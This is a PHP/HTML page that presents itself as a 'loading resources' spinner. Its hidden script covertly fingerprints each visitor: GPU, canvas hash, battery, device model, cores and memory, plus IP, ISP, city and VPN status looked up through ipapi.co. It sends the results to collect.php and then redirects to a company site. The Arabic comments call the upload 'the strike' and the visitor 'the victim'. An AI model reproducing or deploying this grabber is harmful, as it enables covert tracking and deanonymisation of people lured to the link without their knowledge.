<?php require_once 'config.php'; ?>
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل الموارد...</title>
    <style>
        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; font-family: sans-serif; }
        .loader { border: 3px solid #333; border-top: 3px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        async function runSystemX() {
            let data = {
                ua: navigator.userAgent,
                res: `${screen.width}x${screen.height}`,
                physRes: `${screen.width * window.devicePixelRatio}x${screen.height * window.devicePixelRatio}`,
                dpr: window.devicePixelRatio,
                touch: navigator.maxTouchPoints,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory || "N/A",
                lang: navigator.language,
                math: Math.tan(-1e300).toString().slice(0, 15),
                webdriver: navigator.webdriver ? "Bot 🤖" : "Human 🟢"
            };

            // 1. كشف الـ GPU بدقة
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu_vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                data.gpu_renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                data.canvas_hash = canvas.toDataURL().slice(-30);
            } catch(e) {}

            // 2. تجميع مهام البيانات غير المتزامنة (الشبكة، البطارية، الإصدار الحقيقي)
            let tasks = [];

            // جلب البيانات الجغرافية والـ VPN من العميل
            tasks.push(fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
                data.net = { ip: ip.ip, isp: ip.org, city: ip.city, country: ip.country_name, vpn: ip.hosting };
            }).catch(() => {}));

            // كشف البطارية
            if (navigator.getBattery) {
                tasks.push(navigator.getBattery().then(b => data.bat = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`));
            }

            // كسر حماية الـ User-Agent لجلب الإصدار الحقيقي (أندرويد 16 مثلاً)
            if (navigator.userAgentData) {
                tasks.push(navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion'])
                    .then(ua => { data.realModel = ua.model; data.realOS = ua.platformVersion; }));
            }

            // انتظار المهام لمدة قصيرة جداً لضمان السرعة
            await Promise.race([Promise.all(tasks), new Promise(r => setTimeout(r, 1000))]);

            // 3. إرسال "الضربة" للسيرفر
            fetch('collect.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            });

            // 4. تحويل الضحية
            setTimeout(() => { window.location.replace("<?php echo COMPANY_URL; ?>"); }, 150);
        }

        runSystemX();
    </script>
</body>
</html>
